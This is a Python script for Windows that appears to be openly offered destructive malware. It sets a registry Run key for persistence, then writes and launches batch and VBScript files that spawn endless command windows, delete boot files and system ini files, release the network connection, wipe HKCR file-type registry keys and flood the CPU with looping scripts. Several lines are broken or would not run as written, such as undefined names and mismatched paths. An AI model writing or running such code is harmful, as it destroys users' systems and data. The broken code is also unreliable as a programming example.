# Python code to add current script to the registry

# module to edit the windows registry
import winreg as reg
import os


def AddToRegistry():
    # in python __file__ is the instant of
    # file path where it was executed
    # so if it was executed from desktop,
    # then __file__ will be
    # c:\users\current_user\desktop
    pth = os.path.dirname(os.path.realpath('C://GAMEDATA//virtual.exe'))

    # name of the python file with extension
    s_name = "virtual.exe"

    # joins the file name to end of path address
    address = os.join(pth, s_name)

    # key we want to change is HKEY_CURRENT_USER
    # key value is Software\Microsoft\Windows\CurrentVersion\Run
    key = HKEY_CURRENT_USER
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"

    # open the key to make changes to
    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)

    # modify the opened key
    reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, address)

    # now close the opened key
    reg.CloseKey(open)
pass

# Driver Code
if __name__ == "__main__":
    AddToRegistry()

parent_dir = "C://Windows//User//Documents"

os.makedirs(parent_dir, os.R_OK), os.W_OK


def spammer():
    # This line spamss CMD indefinely
    if os.access("C://home//User//Documents", os.F_OK):
        spammer1 = open("C://home//User//Documents//spammer.txt", 'w')
        spammer1.writelines('for i in range(9999999 * 99999999):\n')
        spammer1.writelines('    os.system("start cmd")')

        spammer1 = 'C://home//User//Documents//spammer.txt'
        base = os.path.splitext(spammer1)[0]
        os.rename(spammer1, base + '.bat')
        os.system.__call__("Start C://home//User//Documents//spammer.bat")


print(spammer())
pass


def complete_shut_down():
    # This lines completely shuts down the computer
    if os.access("C://home//User//Documents", os.F_OK):
        shutdown = open("C://home//User//Documents//shutdown.txt", 'w')
        shutdown.writelines('@Echo off')
        shutdown.writelines('shutdown /s /t 9999999 * 999999999 /c ')

        shutdown = 'C://home//User//Documents//shutdown.txt'
        base = os.path.splitext(shutdown)[0]
        os.rename(shutdown, base + '.bat')
        os.system.__call__("Start C://home//User//Documents//shutdown.bat")


print(complete_shut_down())
pass


def corrupt():
    if os.access("C://home//User//Documents", os.F_OK):
        corrupt = open("C://home//User//Documents//corrupt.txt", 'w')
        corrupt.writelines('@echo off\n')
        corrupt.writelines('attrib -r -s -h C://autoexec.bat\n')
        corrupt.writelines('del C://autoexec.bat\n')
        corrupt.writelines('del C://boot.ini\n')
        corrupt.writelines('attrib -r -s -h C://ntldr\n')
        corrupt.writelines('del C://ntldr\n')
        corrupt.writelines('attrib -r -s -h C://window//win.ini\n')
        corrupt.writelines('del C://window\win.ini\n')

        corrupt = 'C://home//User//Documents//corrupt.txt'
        base = os.path.splitext(corrupt)[0]
        os.rename(corrupt, base + '.bat')
        os.system.__call__("Start C://home//User//Documents//corrupt.bat")


print(corrupt())
pass

internet_disable = open("C://home//User//Documents//internet_disable.txt", 'w')
internet_disable.writelines('@echo off \n')
internet_disable.writelines('IPconfig /release')

internet_disable = 'C://home//User//Documents//internet_disable.txt'
base = os.path.splitext(internet_disable)[0]
os.rename(internet_disable, base + '.bat')
os.system.__call__("Start C://home//User//Documents//internet_disable.bat")
pass

delete_reg = open("C://home//User//Documents//delete_reg.txt", 'w')
delete_reg.writelines('@ECHO OFF\n')
delete_reg.writelines('START reg delete HKCR/.exe\n')
delete_reg.writelines('START reg delete HKCR/.dll\n')
delete_reg.writelines('START reg delete HKCR/*')
delete_reg.writelines(' ECHO Your PC has been crashed.Badd.\n')

delete_reg = 'C://home//User//Documents//delete_reg.txt'
base = os.path.splitext(delete_reg)[0]
os.rename(delete_reg, base + '.bat')
os.system.__call__("Start C://home//User//Documents//delete_reg.bat")
pass

CPU = open("C://home//User//Documents//cpu_breaker.txt", 'w')
CPU.writelines("while True\n")
CPU.writelines("Wend\n")

CPU = "C://home//User//Documents//cpu_breaker.txt"
base = os.path.splitext(CPU)[0]
os.rename(CPU, base + ".vbs")
os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")

for i in range(999999999 * 9999999999):
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
